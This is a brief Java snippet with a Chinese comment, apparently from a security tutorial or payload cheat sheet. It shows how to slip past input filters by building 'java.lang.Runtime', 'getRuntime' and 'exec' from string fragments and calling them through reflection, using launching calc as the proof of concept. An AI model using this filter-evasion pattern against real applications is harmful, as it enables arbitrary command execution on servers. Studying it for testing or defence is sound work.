// 在某些场景下，程序可能会过滤输入内容，此时可以通过反射机制以及字符串拼接的方式来绕过实现命令执行：
import java.lang.reflect.Method;
Class<?> rt = Class.forName("java.la" + "ng.Run" + "time");
Method gr = rt.getMethod("getR" + "untime");
Method ex = rt.getMethod("ex" + "ec", String.class);
ex.invoke(gr.invoke(null), "ca" + "lc")

